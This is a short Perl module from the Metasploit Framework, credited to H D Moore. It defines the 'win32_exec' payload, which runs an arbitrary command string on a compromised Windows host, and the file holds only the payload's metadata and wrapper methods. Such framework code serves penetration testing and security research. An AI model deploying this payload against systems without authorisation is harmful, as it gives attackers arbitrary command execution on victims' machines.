package Msf::Payload::win32_exec;
use strict;
use base 'Msf::PayloadComponent::Win32Execute';
sub load {
  Msf::PayloadComponent::Win32Execute->import('Msf::PayloadComponent::NoConnection');
}

my $info =
{
  'Name'         => 'winexec',
  'Version'      => '1.0',
  'Description'  => 'Execute an arbitrary command',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
  'UserOpts'     =>
    {
      'CMD' => [1, 'DATA', 'The command string to execute'],
    },
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

sub CommandString {
  my $self = shift;
  return($self->GetVar('CMD'));
}

1;
